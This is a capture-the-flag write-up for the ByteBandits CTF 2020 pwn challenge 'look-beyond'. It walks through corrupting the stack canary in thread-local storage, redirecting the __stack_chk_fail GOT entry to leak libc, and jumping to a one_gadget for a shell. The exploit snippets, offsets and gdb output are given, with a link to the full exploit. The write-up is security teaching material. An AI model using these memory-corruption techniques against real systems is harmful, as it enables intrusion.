
## look-beyond
### Description

> Beyond the Aquila Rift, or is it in between?
> nc pwn.byteband.it 8000
> Update
> Remote kernel is
> Linux 4.15.0-1057-aws #59-Ubuntu SMP Wed Dec 4 10:02:00 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

### Attachment

[chall](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ByteBanditsCTF2020/pwn/chall/chall)

### Analysis

#### Environment

We can got the OS from the `dockerfile`:

```shell
% cat Dockerfile 
FROM ubuntu:18.04
```

> so the remote environment is same as our local ubuntu 18.04  

#### main function

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  unsigned __int64 size; // ST00_8
  _BYTE *ptr; // ST08_8
  void *buf; // ST18_8
  char v7; // [rsp+20h] [rbp-30h]
  unsigned __int64 v8; // [rsp+48h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  if ( dword_60107C )
  {
    if ( dword_60107C == 1 )
    {
      a2 = &puts;
      printf("puts: %p\n", &puts, a3);
    }
  }
  else
  {
    setvbuf(stdout, 0LL, 2, 0LL);
    a2 = 0LL;
    setvbuf(stdin, 0LL, 2, 0LL);
  }
  printf("size: ", a2);
  size = get_ul(&v7);
  ptr = malloc(size);
  printf("idx: ", size);
  ptr[get_ul(&v7)] = 1;
  printf("where: ");
  buf = get_ul(&v7);
  printf("%ld", buf);
  read(0, buf, 8uLL);
  dword_60107C = 1;
  return 0LL;
}
```

* at the beginning of `main`, if `dword_60107C==1` ,  `puts` address would be leaked

  > that means we should return to `main` again

* set `chunk[idx]` to `1` after any size of chunk allocated

* overwrite anywhere with 8 bytes any values

* at the end of `main`, set `dword_60107C` to `1` 

### Solution

We can hack `canary` to solve this challenges.

#### find stack_guard

`stack_guard` was the ptr pointed to `canary` in a struct of  `Thread Local Storage` 

> **Thread-local storage** (**TLS**) is a computer programming method that uses [static](https://en.wikipedia.org/wiki/Static_memory_allocation) or global [memory](https://en.wikipedia.org/wiki/Computer_storage) local to a [thread](https://en.wikipedia.org/wiki/Thread_(computing)). 

```c
typedef struct  
{  
  void *tcb;        /* Pointer to the TCB.  Not necessarily the  
               thread descriptor used by libpthread.  */  
  dtv_t *dtv;  
  void *self;       /* Pointer to the thread descriptor.  */  
  int multiple_threads;  
  int gscope_flag;  
  uintptr_t sysinfo;  
  uintptr_t stack_guard;  
  uintptr_t pointer_guard;  
  ...  
} tcbhead_t;  
```

We can find the address of  `stack_guard` by searching memory in `gdb`.

At the beginning of `main`,  `canary` was putted into stack:

```c
   0x4007de    mov    rax, qword ptr fs:[0x28]
 ► 0x4007e7    mov    qword ptr [rbp - 8], rax
```

search it: 

```c
pwndbg> search -8 0x9435c714eedda900
                0x7ffff7fe44e8 0x9435c714eedda900
```

![](http://image.taqini.space/img/20200412233253.png)

> gdb runnin in Ubuntu 18.04

the address of `stack_guard` was between `ld-2.27.so` and `stack`

#### Modify canary in TLS

the address of a large allocated memory (e.g. 1000000 bytes)  was near the address of `libc` and `ld`

![](http://image.taqini.space/img/20200412234901.png)

```c
search -8 0x9435c714eedda900
                0x7ff50f4b24e8 0x9435c714eedda900
pwndbg> p $rax
$6 = 140690499289104
pwndbg> p/x $rax
$7 = 0x7ff50f3bc010
pwndbg> p 0x7ff50f4b24e8-0x7ff50f3bc010
$8 = 1008856
```

and the offset between of `chunk` and `stack_guard` doesn't change

so we can allocate a 1000000 bytes chuck and modify canary to trigger `__stack_chk_fail`:

```python
se('1000000')  # size
se('1008857')  # index
```

#### back to main

then overwrite GOT of `__stack_chk_fail` with address of `main` 

```python
se('1000000')  # size
se('1008857')  # index
se('6295576')  # where
se(p64(main))  # content
```

so that we can back to `main` again and the real address of `puts` in libc would be leaked:

```python
ru('puts: ')
puts = eval(rc(14))
```

#### one gadget

```python
libcbase = puts-libc.sym['puts']
info_addr('libcabse',libcbase)
og = [324293,324386,1090444]

se('1000000')
se('2012376')
se('6295576')
se(p64(libcbase+og[1]))
```

modify `canary` again and overwrite GOT of `__stack_chk_fail` with the address of`one_gadget` to getsehll.

### More

the offset is not same between different OS, so we have to download an ubnutu 18.04 environment

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/ByteBanditsCTF2020/pwn/chall) 

